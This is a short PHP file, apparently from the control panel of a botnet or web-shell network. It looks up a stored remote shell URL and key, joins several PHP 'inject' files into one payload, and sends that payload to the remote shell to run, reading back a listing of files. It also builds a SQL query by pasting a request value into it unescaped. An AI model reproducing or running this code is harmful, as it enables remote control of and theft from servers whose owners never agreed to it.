<?php
include_once('includes/functions.php');
$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		$get_php = '$cur_file = \''.$result->shell.'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/functions.php');
		$get_php .= file_get_contents('modules/admins/injects/smarty.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$get_php .= file_get_contents('modules/admins/injects/cmd_configs.php');
		$files = get_http($result->link, $get_php, $result->keyid, $result->shell);
		$smarty->assign('admin', $result);
		$smarty->assign('files', json_decode($files));
	}
}

?>